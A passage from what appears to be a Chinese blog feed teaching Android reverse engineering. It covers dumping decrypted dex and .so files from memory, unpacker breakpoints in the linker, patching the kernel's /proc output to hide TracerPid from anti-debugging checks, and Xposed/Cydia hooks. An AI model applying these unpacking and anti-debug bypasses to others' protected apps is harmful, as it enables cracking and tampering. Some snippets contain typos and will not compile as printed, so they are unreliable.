解密后数据在内存中的位置    len = 0x019CF4; // 文件大小    end = begin + len;    for (b = begin; b &lt; end; b++) {        fputc(Byte(b), fp);    }}</code></pre><h2 id="Dex-加载流程"><a href="#Dex-加载流程" class="headerlink" title="Dex 加载流程"></a>Dex 加载流程</h2><p>vm-&gt;native-&gt;dalvik_systm_DexFile-&gt;openDexFile，读取内存中的 Dex 文件数据，并加载 Dalvik_dalvik_system_DexFile_openDexFile_bytearray。</p><pre><code class="cpp">// 转换存储的dex格式为可执行的dex格式dvmRawDexFileOpenArray(pBytes, length, &amp;pRawDexFile);// 添加到gDvm中addToDexFileTable(pDexOrJar);</code></pre><p>壳实现加载流程：</p><ol><li>内存中解密 dex 函数</li><li>将 dex 存储结构转换为可执行结构</li><li>添加到 gDvm 中（有些壳是自己实现了这个功能，有些是调用了系统的函数）</li><li>抹去 dex 存储结构中的有效数据</li></ol><h2 id="内存-dex-定位"><a href="#内存-dex-定位" class="headerlink" title="内存 dex 定位"></a>内存 dex 定位</h2><p>gDvm.userDexFiles 是存放 dex cookie（dexOfJar 结构）的地方，因此可以通过遍历该数据结构来获得每个 dex 文件的起始地址。</p><p>Dex 重构：通过分析内存中的 dex 存储结构，完成对整个 dex 文件的 dump。</p><p>Dex 转 Odex：优化 vm\analysis\Optimize.cpp-&gt;dvmOptimizeClass</p><p>Dex 校验：vm\analysis\DexVerify.cpp-&gt;dvmVerifyClass</p><p>取消非必要优化与校验：\system\build.prop =&gt; Dalvik.vm.dexopt-flag=v=n,o=n</p><h1 id="ELF-文件简介（ARM-架构下的-ELF）"><a href="#ELF-文件简介（ARM-架构下的-ELF）" class="headerlink" title="ELF 文件简介（ARM 架构下的 ELF）"></a>ELF 文件简介（ARM 架构下的 ELF）</h1><h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><p>ELF 在加载前和加载后的文件格式是完全不同的，给加密提供了方便。</p><p><img src="/pics/Android逆向入门/四/4.png" srcset="/img/loading.gif" alt></p><p>链接执行时，Section Header 中的表将会被映射到 Program Header 中，里面的 ELF Header、Program Header 和 Section header 非常重要，Linker 会根据这三个头信息进行 so 文件加载。</p><p>PS：如何从内存中 dump 下 so 文件？开启 IDA 动态调试，在 Module 窗口中找到对应的 so 文件，根据 so 文件的起始地址和文件大小，使用 IDC 脚本 dump 下来。</p><h3 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h3><p>存储 so 文件最为基本的信息，如 so 运行的 CPU 平台、Program Header 数量、Section Header 数量等，重要性等同于 Dex Header。</p><pre><code class="bash">$ readelf -h libxtian.soELF Header:  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00  Class:                             ELF32  Data:                              2&#39;s complement, little endian  Version:                           1 (current)  OS/ABI:                            UNIX - System V  ABI Version:                       0  Type:                              DYN (Shared object file)  Machine:                           ARM  Version:                           0x1  Entry point address:               0x0  Start of program headers:          52 (bytes into file)  Start of section headers:          117240 (bytes into file)  Flags:                             0x5000200, Version5 EABI, soft-float ABI  Size of this header:               52 (bytes)  Size of program headers:           32 (bytes)  Number of program headers:         8  Size of section headers:           40 (bytes)  Number of section headers:         25  Section header string table index: 24</code></pre><h3 id="Section-Header"><a href="#Section-Header" class="headerlink" title="Section Header"></a>Section Header</h3><p>存储 so 的链接用信息，主要是用于给外部程序详细地提供本 so 的信息，比如第几行对应哪个函数、什么名字、对应着源码的什么位置等等。IDA 就是通过读取该头信息进行 so 分析的。</p><pre><code class="bash">$ readelf -S libxtian.soThere are 25 section headers, starting at offset 0x1c9f8:Section Headers:  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al  [ 0]                   NULL            00000000 000000 000000 00      0   0  0  [ 1] .note.gnu.build-i NOTE            00000134 000134 000024 00   A  0   0  4  [ 2] .dynsym           DYNSYM          00000158 000158 000570 10   A  3   1  4  [ 3] .dynstr           STRTAB          000006c8 0006c8 00034e 00   A  0   0  1  [ 4] .hash             HASH            00000a18 000a18 000270 04   A  2   0  4  [ 5] .gnu.version      VERSYM          00000c88 000c88 0000ae 02   A  2   0  2  [ 6] .gnu.version_d    VERDEF          00000d38 000d38 00001c 00   A  3   1  4  [ 7] .gnu.version_r    VERNEED         00000d54 000d54 000020 00   A  3   1  4  [ 8] .rel.dyn          REL             00000d74 000d74 0050f8 08   A  2   0  4  [ 9] .rel.plt          REL             00005e6c 005e6c 0000a0 08  AI  2  10  4  [10] .plt              PROGBITS        00005f0c 005f0c 000104 00  AX  0   0  4  [11] .text             PROGBITS        00006010 006010 013684 00  AX  0   0  4  [12] .ARM.extab        PROGBITS        00019694 019694 0001a4 00   A  0   0  4  [13] .ARM.exidx        ARM_EXIDX       00019838 019838 000250 08  AL 11   0  4  [14] .rodata           PROGBITS        00019a90 019a90 0002d0 00   A  0   0 16  [15] .fini_array       FINI_ARRAY      0001ad64 019d64 000008 00  WA  0   0  4  [16] .init_array       INIT_ARRAY      0001ad6c 019d6c 000004 00  WA  0   0  1  [17] .dynamic          DYNAMIC         0001ad70 019d70 000120 08  WA  3   0  4  [18] .got              PROGBITS        0001ae90 019e90 000170 00  WA  0   0  4  [19] .data             PROGBITS        0001b000 01a000 002870 00  WA  0   0 16  [20] .bss              NOBITS          0001d870 01c870 0001d8 00  WA  0   0  4  [21] .comment          PROGBITS        00000000 01c870 00003d 01  MS  0   0  1  [22] .note.gnu.gold-ve NOTE            00000000 01c8b0 00001c 00      0   0  4  [23] .ARM.attributes   ARM_ATTRIBUTES  00000000 01c8cc 000036 00      0   0  1  [24] .shstrtab         STRTAB          00000000 01c902 0000f6 00      0   0  1Key to Flags:  W (write), A (alloc), X (execute), M (merge), S (strings)  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)  O (extra OS processing required) o (OS specific), p (processor specific)</code></pre><h3 id="Program-Header"><a href="#Program-Header" class="headerlink" title="Program Header"></a>Program Header</h3><p>存储 so 文件运行时需要的信息。该信息会直接被 Linker 所使用，运用于 so 加载。因此这个 Header 的数据是肯定可信的</p><pre><code class="bash">$ readelf -l libxtian.soElf file type is DYN (Shared object file)Entry point 0x0There are 8 program headers, starting at offset 52Program Headers:  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align  PHDR           0x000034 0x00000034 0x00000034 0x00100 0x00100 R   0x4  LOAD           0x000000 0x00000000 0x00000000 0x19d60 0x19d60 R E 0x1000  LOAD           0x019d64 0x0001ad64 0x0001ad64 0x02b0c 0x02ce4 RW  0x1000  DYNAMIC        0x019d70 0x0001ad70 0x0001ad70 0x00120 0x00120 RW  0x4  NOTE           0x000134 0x00000134 0x00000134 0x00024 0x00024 R   0x4  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0  EXIDX          0x019838 0x00019838 0x00019838 0x00250 0x00250 R   0x4  GNU_RELRO      0x019d64 0x0001ad64 0x0001ad64 0x0029c 0x0029c RW  0x4 Section to Segment mapping:  Segment Sections...   00   01     .note.gnu.build-id .dynsym .dynstr .hash .gnu.version .gnu.version_d .gnu.version_r .rel.dyn .rel.plt .plt .text .ARM.extab .ARM.exidx .rodata   02     .fini_array .init_array .dynamic .got .data .bss   03     .dynamic   04     .note.gnu.build-id   05   06     .ARM.exidx   07     .fini_array .init_array .dynamic .got</code></pre><h2 id="加载-so-的流程"><a href="#加载-so-的流程" class="headerlink" title="加载 so 的流程"></a>加载 so 的流程</h2><p>Android 上的 ELF 文件是通过 Linker（位于 Bionic/Linker）加载到内存中并进行执行的。所以通过研究 Linker 可以清楚地知道 Android 系统到底使用了到了 so 的哪些数据。Linker 启动时会先对自身的函数表数据等进行重定位，然后再对其他 so 文件进行定位。</p><p>Linkere 加载中只会用到 Program Header（甚至直接删除 Section Header 也是可以的）。Program Header 解析：</p><pre><code class="cpp">link.cpp -&gt; soinfo *do_dlopen(const char *name, int flags) // so加载find_library(name);si-&gt;CallConstructors();CallFunction(&quot;DT_INIT&quot;, init_func); // so脱壳点CallArray(&quot;DT_INIT_ARRAY&quot;, init_array, init_array_count, false); // dex脱壳点</code></pre><p>加载 so 的时候，有两种加载方式，一个是直接 load，还有一个是 loadLibrary。无论是哪种方式，都会先获取 ClassLoader，然后再调用相应的方法。当传进来的 loader 不为空，则会调用 findLibrary 方法，然后执行 doLoad 方法，如果 loader 为空，则会执行另一个流程，但是后面也会执行 doLoad 方法。</p><h2 id="ELF-文件变形与保护（阻碍分析）"><a href="#ELF-文件变形与保护（阻碍分析）" class="headerlink" title="ELF 文件变形与保护（阻碍分析）"></a>ELF 文件变形与保护（阻碍分析）</h2><ul><li>Section 段处理：鉴于 Section Header 没有被 Linker 用于加载，所以可以对 Section 段写入无用数据，可以阻碍静态分析软件的分析。</li><li>Program 段处理：Program 段中可以对 DYNAMIC 区段进行混淆，添加重复的数据以及无效的数据。</li></ul><h1 id="so-文件加壳修复"><a href="#so-文件加壳修复" class="headerlink" title="so 文件加壳修复"></a>so 文件加壳修复</h1><pre><code class="bash">Program Headers:  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align  EXIDX          0x02867c 0x0002867c 0x0002867c 0x00568 0x00568 R   0x4  LOAD           0x000000 0x00000000 0x00000000 0x13294 0x13294 R E 0x8000  LOAD           0x018c10 0x00030c10 0x00030c10 0x0052c 0x01548 RW  0x8000  DYNAMIC        0x018c74 0x00030c74 0x00030c74 0x00108 0x00108 RW  0x4  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4  GNU_RELRO      0x018c10 0x00030c10 0x00030c10 0x003f0 0x003f0 R   0x1</code></pre><p>加过壳的标志：<code>FileSiz!=MemSiz</code>，明显存在加载后在内存进行解码的可能。函数地址也在文件之外。</p><p>修复：dump 内存，数据对齐重定位。</p><h1 id="Android-源码定制添加反反调试基址"><a href="#Android-源码定制添加反反调试基址" class="headerlink" title="Android 源码定制添加反反调试基址"></a>Android 源码定制添加反反调试基址</h1><p>反调试一般会检测 proc 下是否有 status/stat 文件。首先修改 kernel 源码中的 <code>fs/proc/base.c</code>。修改 proc_pid_wchan 函数的返回值：</p><pre><code class="cpp">static int proc_pid_wchan(struct task_struct *task, char *buffer){        unsigned long wchan;        char symname[KSYM_NAME_LEN];        wchan = get_wchan(task);        if (lookup_symbol_name(wchan, symname) &lt; 0)                if (!ptrace_may_access(task, PTRACE_MODE_READ))                        return 0;                else                        return sprintf(buffer, &quot;%lu&quot;, wchan);        else {                if (strstr(symname, &quot;trace&quot;)) { // 检测进程中是否有trace这个字符串                        return sprintf(buffer, &quot;%s&quot;, &quot;sys_epoll_wait&quot;); // sys_epoll_wait用来获取文件状态已经就绪的事件                }                return sprintf(buffer, &quot;%s&quot;, symname);        }}</code></pre><p>然后是 <code>fs/proc/array.c</code> 文件，分别修改 tast_state 函数和 task_state_array 变量：</p><pre><code class="cpp">static inline void task_state(struct seq_file *m, struct pid_namespace *ns,                                struct pid *pid, struct task_struct *p){        struct group_info *group_info;        int g;        struct fdtable *fdt = NULL;        const struct cred *cred;        pid_t ppid, tpid;        rcu_read_lock();        ppid = pid_alive(p) ?                task_tgid_nr_ns(rcu_dereference(p-&gt;real_parent), ns) : 0;        tpid = 0;        if (pid_alive(p)) {                struct task_struct *tracer = ptrace_parent(p);                if (tracer)                        tpid = task_pid_nr_ns(tracer, ns);        }        cred = get_task_cred(p);        seq_printf(m,                &quot;State:\t%s\n&quot;                &quot;Tgid:\t%d\n&quot;                &quot;Pid:\t%d\n&quot;                &quot;PPid:\t%d\n&quot;                &quot;TracerPid:\t%d\n&quot;                &quot;Uid:\t%d\t%d\t%d\t%d\n&quot;                &quot;Gid:\t%d\t%d\t%d\t%d\n&quot;,                get_task_state(p),                task_tgid_nr_ns(p, ns),                pid_nr_ns(pid, ns),                ppid, 0, // 把tpid修改为0                cred-&gt;uid, cred-&gt;euid, cred-&gt;suid, cred-&gt;fsuid,                cred-&gt;gid, cred-&gt;egid, cred-&gt;sgid, cred-&gt;fsgid);        task_lock(p);        if (p-&gt;files)                fdt = files_fdtable(p-&gt;files);        seq_printf(m,                &quot;FDSize:\t%d\n&quot;                &quot;Groups:\t&quot;,                fdt ? fdt-&gt;max_fds : 0);        rcu_read_unlock();        group_info = cred-&gt;group_info;        task_unlock(p);        for (g = 0; g &lt; min(group_info-&gt;ngroups, NGROUPS_SMALL); g++)                seq_printf(m, &quot;%d &quot;, GROUP_AT(group_info, g));        put_cred(cred);        seq_putc(m, &#39;\n&#39;);}static const char * const task_state_array[] = {        &quot;R (running)&quot;,          /*   0 */        &quot;S (sleeping)&quot;,         /*   1 */        &quot;D (disk sleep)&quot;,       /*   2 */        &quot;S (sleeping)&quot;,         // &quot;T (stopped)&quot;,          /*   4 */        &quot;S (sleeping)&quot;,         // &quot;t (tracing stop)&quot;,     /*   8 */        &quot;Z (zombie)&quot;,           /*  16 */        &quot;X (dead)&quot;,             /*  32 */        &quot;x (dead)&quot;,             /*  64 */        &quot;K (wakekill)&quot;,         /* 128 */        &quot;W (waking)&quot;,           /* 256 */};</code></pre><p>然后可以根据<a href="https://se8s0n.github.io/2019/04/19/%E5%B0%9D%E8%AF%95%E7%BB%95%E8%BF%87TracePID%E5%8F%8D%E8%B0%83%E8%AF%95%E4%BA%8C%E2%80%94%E2%80%94%E4%BB%8E%E6%BA%90%E7%A0%81%E5%85%A5%E6%89%8B/" target="_blank" rel="noopener">这篇文章</a>把 boot.img 重新打包并刷入手机。</p><h1 id="Refereences"><a href="#Refereences" class="headerlink" title="Refereences"></a>Refereences</h1><p><a href="https://www.bilibili.com/video/av45424886" target="_blank" rel="noopener">https://www.bilibili.com/video/av45424886</a><br><a href="https://www.jianshu.com/p/f7f0a712ddfe" target="_blank" rel="noopener">https://www.jianshu.com/p/f7f0a712ddfe</a><br><a href="https://source.android.com/devices/tech/dalvik/dex-format.html" target="_blank" rel="noopener">https://source.android.com/devices/tech/dalvik/dex-format.html</a><br><a href="https://www.jianshu.com/p/f7f0a712ddfe" target="_blank" rel="noopener">https://www.jianshu.com/p/f7f0a712ddfe</a><br><a href="http://gnaixx.cc/2016/11/26/20161126dex-file/" target="_blank" rel="noopener">http://gnaixx.cc/2016/11/26/20161126dex-file/</a><br><a href="https://www.cnblogs.com/stars-one/p/8890162.html" target="_blank" rel="noopener">https://www.cnblogs.com/stars-one/p/8890162.html</a><br><a href="http://shxi.me/posts/7b82cd68.html" target="_blank" rel="noopener">http://shxi.me/posts/7b82cd68.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Android 加壳和脱壳入门。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向入门（三）</title>
    <link href="blog.b3ale.cn/2020/02/12/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>blog.b3ale.cn/2020/02/12/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2020-02-12T06:06:59.000Z</published>
    <updated>2020-03-20T02:19:06.080Z</updated>
    
    <content type="html"><![CDATA[<p>记录 Jeb 插件编写、简单 Hook 以及 Android 系统结构简述。</p><a id="more"></a><h1 id="JEB-插件扩展"><a href="#JEB-插件扩展" class="headerlink" title="JEB 插件扩展"></a>JEB 插件扩展</h1><h2 id="插件帮助文件"><a href="#插件帮助文件" class="headerlink" title="插件帮助文件"></a>插件帮助文件</h2><pre><code>$JEB/doc/apidoc</code></pre><h2 id="插件编写"><a href="#插件编写" class="headerlink" title="插件编写"></a>插件编写</h2><p>语言：Java/Python</p><pre><code class="java">import jeb.api.IScript;public class decJebString implemants IScript {    private JebInstance jeb = null;    @Override    public void run(JebInstance jebInstance) {        jeb = jebInstance;        jeb.print(&quot;Hello World!!!&quot;);    }}</code></pre><p>强制反编译结果，相当于 Ctrl+F5：</p><pre><code class="java">import jeb.api.IScript;public class decJebString implemants IScript {    private static String targetSignature = &quot;Lcom/pnfsoftware/jebglobal/decStr;-&gt;decodeString([BII)Ljava/lang/String;&quot;;    private JebInstance jeb = null;    @Override    public void run(JebInstance jebInstance) {        jeb = jebInstance;        Dex dex = jeb.getDex();        List&lt;String&gt; classSignatures = dex.getClassSignatures(true);        int methodCount = dex.getMethodCount();        String methodSig;        for(int i = 0; i &lt; methodCount; i++) {            DexMethod dexMethod = dex.getMethod(i);            int idx = dexMethod.getIndex();            methodSig = dexMethod.getSignature(true);            if(methodSig.equals(targetSignature)) {                List&lt;Integer&gt; methodReferences = dex.getMethodReferences(idx); // 获取交叉引用                for(Integer refIdx : methodReferences) {                    DexMethod refDexMethod = dex.getMethod(refIdx);                    jeb.decompileMethod(refDexMethod.getSignature(true));                    ...                }            }        }        ...    }    ...}</code></pre><h1 id="Android-快速定位关键代码"><a href="#Android-快速定位关键代码" class="headerlink" title="Android 快速定位关键代码"></a>Android 快速定位关键代码</h1><ul><li>字符串、特征字</li><li>关键 API 监控</li><li>Hook 解密函数</li><li>Monitor</li><li>插 Log 信息<ul><li><code>invoke-static {v0}, Lcom/android/killer/Log;-&gt;LogStr(Ljava/lang/String;)V</code></li></ul></li><li>动态调试</li></ul><h1 id="快速-Hook-代码"><a href="#快速-Hook-代码" class="headerlink" title="快速 Hook 代码"></a>快速 Hook 代码</h1><p>对函数进行挂钩，可以影响整个函数的执行。挂钩后，注入的代码可以接管整个函数，修改函数的参数，返回值，甚至整个函数的行为等。</p><h2 id="Cydia-Substrate"><a href="#Cydia-Substrate" class="headerlink" title="Cydia Substrate"></a><a href="http://www.cydiasubstrate.com/" target="_blank" rel="noopener">Cydia Substrate</a></h2><p>只要知道类名就可以 Hook，而且属于系统全局属性，软件基本上不能检测到。</p><h3 id="Hook-Java"><a href="#Hook-Java" class="headerlink" title="Hook Java"></a>Hook Java</h3><ol><li>新建空项目</li><li>导入 lib 文件 substrate-api.jar</li><li>修改 AndroidManifest.xml 文件</li><li>编写入口类</li><li>安装激活插件，重启后可以看到插件效果</li></ol><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>修改 AndroidManifest.xml 文件：</p><pre><code class="xml">&lt;manifest&gt;    &lt;application&gt;        ...        &lt;meta-data android:name=&quot;com.saurik.substrate.main&quot; android:value=&quot;com.assassinq.cydiajavahook.CydiaMain&quot;/&gt;        ...    &lt;/application&gt;    &lt;uses-permission android:name=&quot;cydia.permission.SUBSTRATE&quot;/&gt;    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;&gt;&lt;/uses-permission&gt;&lt;/manifest&gt;</code></pre><p>编写入口类</p><pre><code class="java">package com.assassinq.cydiajavahook;import com.saurik.substrate.MS;import java.lang.reflect.Method;public class CydiaMain {    static void initialize() {        MS.hookClassLoad(&quot;android.content.res.Resources&quot;, new MS.ClassLoadHook() {            @Override            public void classLoaded(Class&lt;?&gt; resources) {                Method getColor;                try {                    getColor = resources.getDeclaredMethod(&quot;getColor&quot;, Integer.TYPE);                } catch (Exception e) {                    getColor = null;                }                if (getColor != null) {                    final MS.MethodPointer old = new MS.MethodPointer();                    MS.hookMethod(resources, getColor, new MS.MethodHook() {                        @Override                        public Object invoked(Object res, Object... args) throws Throwable {                            int color = (Integer) old.invoke(res, args);                            return color &amp; ~0xFFFFFF | 0x00AAAA;                        }                    }, old);                }            }        });    }}</code></pre><p>编写完成后，将程序安装到手机上，会弹出 Substrate extentions updated：</p><p><img src="/pics/Android逆向入门/三/1.png" srcset="/img/loading.gif" alt></p><p>点击进入 Cydia Substrate，点击 Restart System (Soft) 来重启系统：</p><p><img src="/pics/Android逆向入门/三/2.png" srcset="/img/loading.gif" alt></p><p>重启后发现系统某些部分的颜色已经被我们 Hook 成了其他颜色：</p><p><img src="/pics/Android逆向入门/三/3.png" srcset="/img/loading.gif" alt></p><p>在设置中打开更加明显：</p><p><img src="/pics/Android逆向入门/三/4.png" srcset="/img/loading.gif" alt></p><h4 id="Java-反射"><a href="#Java-反射" class="headerlink" title="Java 反射"></a>Java 反射</h4><p>Java 可以通过反射方法去获取类以及它的成员。反射相当于提供一些函数，让我们在不知道原始累的定义的情况下，去修改类中相关的成员的属性、值等。</p><p>所有类都是继承自 Object 类的，所以都可以使用 Object 的方法。也可以强制转换为 Object。所有，遇到无法表示出来的对象时，直接用 Object 即可。</p><p>获取对象的类：</p><pre><code class="java">Object obj = &quot;123&quot;;Class clazz = obj.getClass();</code></pre><p>获取类中的方法（使用对应的不是以 s 为后缀的函数可以获取特定的函数或 field）：</p><pre><code class="java">Method[] mPubMethods = clazz.getMethods(); // 获取公有可直接调用的方法Method[] mDeclareMethods = clazz.getDeclareMethods(); // 获取类中声明的所有方法Field[] mPubFields = clazz.getFields(); // 获取public的fieldField[] mDeclareFields = clazz.getDeclaredFields(); // 获取声明的所有field</code></pre><p>方法调用：</p><pre><code class="java">method.invoke(obj, arg)</code></pre><p>域操作：</p><pre><code class="java">field.set(obj, &quot;1&quot;);field.get(obj);</code></pre><p>访问权限设置（域与方法都一样，控制是否可以直接访问，其实就是相当于 public 属性）：</p><pre><code class="java">field.isAccessible();field.setAccessible(true);</code></pre><p>其余的函数，可以获取函数的名称，还有其他种种信息：</p><pre><code class="java">field.getName();field.toString();Class.forName(&quot;android.view.Menu&quot;); // 寻找类，必须是一个classloader下的才能使用</code></pre><h2 id="Xposed"><a href="#Xposed" class="headerlink" title="Xposed"></a>Xposed</h2><p>Xposed 是在程序启动的时候同时加载的，因此他的 Hook 是区分进程的。对于程序的类和参数可以通过名字来进行 Hook。Xposed 的 Hook 分为函数执行前和执行后两个位置，可以分别进行参数修改和结果修改。如果不想进行调用的话，可以在执行前使用 <code>setResult(NULL)</code> 函数。比起 Cydia 使用范围更加广泛，各种插件都是基于 Xposed 的，并且是开源的。</p><ol><li>新建基础项目</li><li>导入 lib 文件 XposedBridgeApi-54.jar（compileOnly 模式，也就是不参与编译到最终文件中）</li><li>修改 AndroidManifest.xml 文件</li><li>入口类编写</li><li>设置启动入口：在 assets 文件夹中，新建 xposed_init 文件，写入入口类的信息 com.assassinq.xposedjavahook.XposedMain</li><li>安装激活插件，重启后可以看到插件效果</li></ol><p>修改 app 下的 build.gradle 文件，将对应 lib/XposedBridgeApi-54.jar 的操作 implementation 修改成 compileOnly：</p><pre><code class="gradle">...dependencies {    ...    compileOnly files(&#39;lib/XposedBridgeApi-54.jar&#39;)}</code></pre><h3 id="Hook-Java-1"><a href="#Hook-Java-1" class="headerlink" title="Hook Java"></a>Hook Java</h3><p>修改 AndroidManifest.xml 文件：</p><pre><code class="xml">&lt;manifest&gt;    &lt;application&gt;        ...        &lt;meta-data android:name=&quot;xposedmodule&quot; android:value=&quot;true&quot;/&gt;        &lt;meta-data android:name=&quot;xposeddescription&quot; android:value=&quot;Hook getColor&quot;/&gt;        &lt;meta-data android:name=&quot;xposedminversion&quot; android:value=&quot;54&quot;/&gt;    &lt;/application&gt;    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;&gt;&lt;/uses-permission&gt;&lt;/manifest&gt;</code></pre><p>入口类编写，新建一个类文件：</p><pre><code class="java">public class XposedMain implements IXposedHookLoadPackage {    @Override    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam param) throws Throwable {//        if (param.packageName.equals(&quot;apk&quot;)) {            try {                findAndHookMethod(&quot;android.content.res.Resources&quot;, param.classLoader, &quot;getColor&quot;, int.class, new myGetColor());//                waitForDebugger();            } catch (Exception e) {                XposedBridge.log(e);            }//        }    }}class myGetColor extends XC_MethodHook {    @Override    protected void beforeHookedMethod(MethodHookParam param) throws Throwable {        Log.d(&quot;DEBUG&quot;, &quot;Before Method Hook&quot;);    }    @Override    protected void afterHookedMethod(MethodHookParam param) throws Throwable {        Log.d(&quot;DEBUG&quot;, &quot;After Method Hook&quot;);        int res = (int) param.getResult();s        res = res &amp; ~0xFFFFFF | 0x00AAAA;        param.setResult(res);    }}</code></pre><p>同样，编写完成后会弹出一个 Xposed module is not activated：</p><p><img src="/pics/Android逆向入门/三/5.png" srcset="/img/loading.gif" alt></p><p>点击后勾选我们编写的模块，并在 Framework 界面点击 Soft Reboot 以激活插件：</p><p><img src="/pics/Android逆向入门/三/6.png" srcset="/img/loading.gif" alt></p><p>重启后系统部分颜色同样被改变，但效果没有 Cydia 的好：</p><p><img src="/pics/Android逆向入门/三/7.png" srcset="/img/loading.gif" alt></p><h3 id="classLoader"><a href="#classLoader" class="headerlink" title="classLoader"></a>classLoader</h3><p>与 Java 上的类似，就是一个类装载器。与 Java 不同的是，classLoader 所加载的就是 dex 文件本身。所以通过程序的 classLoader，可以取得程序的 dex 中所定义的所有类及其成员函数。同理，如果一个程序有多个 dex，那么会对应着多个 classLoader，特别是使用动态加载的 dex，则需要传递想要的 classLoader 才可以进行数据获取。</p><h1 id="Android-源码浅析"><a href="#Android-源码浅析" class="headerlink" title="Android 源码浅析"></a>Android 源码浅析</h1><h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><p>Ubuntu 14.04</p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>首先搭建好 JDK 6 的环境：</p><pre><code class="bash">cd &amp;&amp; wget https://repo.huaweicloud.com/java/jdk/6u45-b06/jdk-6u45-linux-x64.binchmod +x jdk-6u45-linux-x64.bin &amp;&amp; ./jdk-6u45-linux-x64.bincd /usr &amp;&amp; sudo mkdir javacd java &amp;&amp; sudo mv ~/jdk1.6.0_45 .vim ~/.bashrc# export JAVA_HOME=&quot;/usr/java/jdk1.6.0_45&quot;# export JRE_HOME=&quot;$JAVA_HOME/jre&quot;# export CLASSPATH=&quot;$CLASSPATH:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar&quot;# export PATH=&quot;$PATH:$JAVA_HOME/bin&quot;source ~/.bashrcjava -version</code></pre><p>然后安装一些编译时需要用到的依赖文件：</p><pre><code class="bash">sudo apt-get updatesudo apt-get install git-core gnupg flex bison gperf build-essential zip curl zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z-dev ccache libgl1-mesa-dev libxml2-utils xsltproc unzip</code></pre><p>添加 51-android.rules，使得手机 USB 连接到 Ubuntu 能够被识别：</p><pre><code class="bash">cd &amp;&amp; wget https://raw.githubusercontent.com/M0Rf30/android-udev-rules/master/51-android.rulessudo mv 51-android.rules /etc/udev/rules.d/sudo udevadm control --reload-rules</code></pre><p>接下来使用 repo 工具同步下载 Android 源码：</p><pre><code class="bash">cd &amp;&amp; mkdir bin # export PATH=&quot;$HOME/bin:$PATH&quot;curl https://mirrors.tuna.tsinghua.edu.cn/git/git-repo &gt; ~/bin/repo# curl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/bin/repochmod a+x ~/bin/repoexport WORKING_DIRECTORY=&quot;android-4.4.3_r1&quot;mkdir $WORKING_DIRECTORY &amp;&amp; cd $WORKING_DIRECTORYgit config --global user.name &quot;Your Name&quot;git config --global user.email &quot;your@example.com&quot;# export REPO_URL=&quot;https://aosp.tuna.tsinghua.edu.cn/android/git-repo&quot;# vim ~/bin/repo # REPO_URL = &#39;https://aosp.tuna.tsinghua.edu.cn/android/git-repo&#39;repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-4.4.3_r1# repo init -u https://android.googlesource.com/platform/manifest -b android-4.4.3_r1repo sync # Takes a very long time# repo sync -c --no-clone-bundle --no-tags --prune -j4</code></pre><p>同步完成后进行编译：</p><pre><code class="bash">source build/envsetup.sh # Setup environmentlunch aosp_arm-eng # Setup choicesexport USE_CCACHE=1 # Enable ccacheprebuilts/misc/linux-x86/ccache/ccache -M 100G # Set ccache memory = 100G# export CCACHE_DIR=$YOUR_PATH/.ccache # Set ccache dir # Default in $HOME/.ccachemake -j4</code></pre><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p>安装一下 Android Studio，用来作为查看源码的编辑器：</p><pre><code class="bash">sudo apt-get updatesudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386 lib32z1 libbz2-1.0:i386wget https://dl.google.com/dl/android/studio/ide-zips/3.5.3.0/android-studio-ide-191.6010548-linux.tar.gztar zxvf android-studio-ide-191.6010548-linux.tar.gzsudo mv android-studio /usr/localcd /usr/local/android-studio/bin./studio.sh</code></pre><p>PS：<a href="https://www.v2ex.com/t/455266" target="_blank" rel="noopener">谷歌在国内有服务器，用 ping.chinaz.com 解析出 dl.google.com 最快的 ip，在 hosts 里写死就行了，直接满速下载。</a></p><p>生成 Android Studio 文件：</p><pre><code class="bash">cd $HOME/$WORKING_DIRECTORY &amp;&amp; source build/envsetup.shlunch aosp_arm-engcd development/tools/idegen &amp;&amp; mmcd $HOME/$WORKING_DIRECTORY &amp;&amp; ./development/tools/idegen/idegen.sh</code></pre><p>运行完后，将根目录下的 android.ipr 导入 Android Studio 即可。目录结构：</p><table><thead><tr><th style="text-align:center">文件夹/文件</th><th style="text-align:center">包含内容</th></tr></thead><tbody><tr><td style="text-align:center">abi</td></tr><tr><td style="text-align:center">art</td><td style="text-align:center">art 模式相关的代码</td></tr><tr><td style="text-align:center">bionic</td><td style="text-align:center">各种 so 库的源代码</td></tr><tr><td style="text-align:center">bootable</td><td style="text-align:center">recovery、bootloader、diskinstaller</td></tr><tr><td style="text-align:center">build</td><td style="text-align:center">源码编译生成的规则代码</td></tr><tr><td style="text-align:center">cts</td><td style="text-align:center">Android 兼容性测试套件标准</td></tr><tr><td style="text-align:center">dalvik</td><td style="text-align:center">Dalvik 